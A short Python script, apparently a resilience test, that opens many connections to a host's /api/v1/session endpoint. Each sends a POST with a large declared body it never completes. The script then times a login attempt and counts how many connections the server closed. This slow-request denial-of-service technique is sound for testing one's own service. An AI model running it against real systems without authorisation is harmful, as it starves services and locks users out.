import socket, sys, time, json, urllib.request
host, port, n, wait = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
socks = []
for i in range(n):
    s = socket.create_connection((host, port))
    s.sendall(f"POST /api/v1/session HTTP/1.1\r\nHost: {host}:{port}\r\nOrigin: http://{host}:{port}\r\nContent-Type: application/json\r\nContent-Length: 15000\r\n\r\n{{".encode())
    socks.append(s)
time.sleep(wait)  # completely silent
req = urllib.request.Request(f"http://{host}:{port}/api/v1/session", data=json.dumps({"password": "y" * 12}).encode(), method="POST",
      headers={"Content-Type": "application/json", "Origin": f"http://{host}:{port}"})
t = time.perf_counter()
try:
    with urllib.request.urlopen(req, timeout=10) as r: print("login", r.status)
except urllib.error.HTTPError as e: print(f"nach {wait}s Stille: Login HTTP {e.code} nach {(time.perf_counter()-t)*1000:.0f} ms")
except Exception as e: print(f"nach {wait}s Stille: Login {type(e).__name__} nach {(time.perf_counter()-t)*1000:.0f} ms (blockiert)")
alive = 0
for s in socks:
    try: s.settimeout(0.2); d = s.recv(1); alive += (d == b"")  # b"" = closed by server
    except socket.timeout: pass
    except OSError: alive += 1
print(f"vom Server geschlossene Verbindungen: {alive}/{n}")
for s in socks: s.close()
